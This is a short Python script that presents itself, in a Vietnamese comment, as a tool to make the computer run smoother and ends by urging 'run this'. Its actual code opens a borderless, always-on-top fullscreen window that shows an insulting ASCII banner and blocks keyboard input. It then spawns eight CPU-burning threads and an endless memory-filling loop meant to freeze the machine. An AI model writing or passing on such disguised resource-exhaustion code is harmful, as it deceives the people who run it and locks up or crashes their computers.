# giúp máy mượt hơn #
import tkinter as tk
ASCII_TROLL_TEXT = """
                              .__            ___.           
  ____    ____  __ __    ____ |  |__  __ __  \_ |__   ____  
 /    \  / ___\|  |  \  /    \|  |  \|  |  \  | __ \ /  _ \ 
|   |  \/ /_/  >  |  / |   |  \   Y  \  |  /  | \_\ (  <_> )
|___|  /\___  /|____/  |___|  /___|  /____/   |___  /\____/ 
     \//_____/              \/     \/             \/      
"""
def create_lock_screen():
  root = tk.Tk()
  sw = root.winfo_screenwidth()
  sh = root.winfo_screenheight()
  root.geometry(f"{sw}x{sh}+0+0")
  root.overrideredirect(True)
  root.attributes("-topmost", True)
  root.configure(bg="black")
  label = tk.Label(
      root,
      text=ASCII_TROLL_TEXT + "\n\n",
      font=("Consolas", 16, "bold"),
      bg="black",
      fg="#FF0000",
      justify="center",
  )
  label.pack(expand=True)
  root.bind("<Key>", lambda event: "break")
  root.focus_force()
  root.mainloop()
if __name__ == "__main__":
  create_lock_screen()
import threading
print(
    "Goodbye your pc"
)
print("......")
input(
    "Stand for freeze "
    " end "
)
A = []
def burn_cpu():
  x = 0
  while True:
    x += 1
def burn_ram():
  while True:
    try:
      A.append("Goodbye" * 10**8)
    except:
      pass
print("\nGoodbye_pc")
for i in range(8):  
  threading.Thread(target=burn_cpu, daemon=True).start()
threading.Thread(target=burn_ram, daemon=True).start()
while True:
  pass 
####################################################
###              chạy cái này đi                 ###
####################################################
